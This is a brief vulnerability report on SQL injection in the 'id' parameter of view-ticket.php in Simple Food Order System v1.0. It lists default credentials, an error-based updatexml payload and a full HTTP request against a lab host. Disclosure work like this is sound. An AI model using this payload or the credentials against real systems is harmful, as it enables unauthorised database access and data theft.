# Simple Food Order System v1.0 by code-projects has SQL injection 2

BUG_Author: Zhang Qi

Login account: root/toor

vendors: https://code-projects.org/simple-food-order-system-in-php-with-source-code/

The program is built using the xmapp-php8.1 version

dbname=food

Vulnerability File: /food/view-ticket.php

Vulnerability location: /food/view-ticket.php?id=, id

[+] Payload: /food/view-ticket.php?id=1 and updatexml(1,concat(0x7e,database()),3)# // Leak place ---> id

```sql
GET /food/view-ticket.php?id=1%20and%20updatexml(1,concat(0x7e,database()),3) HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close


```

<img width="1602" height="365" alt="image" src="https://github.com/user-attachments/assets/b1c88479-f299-4491-a1e5-5457284e03ba" />
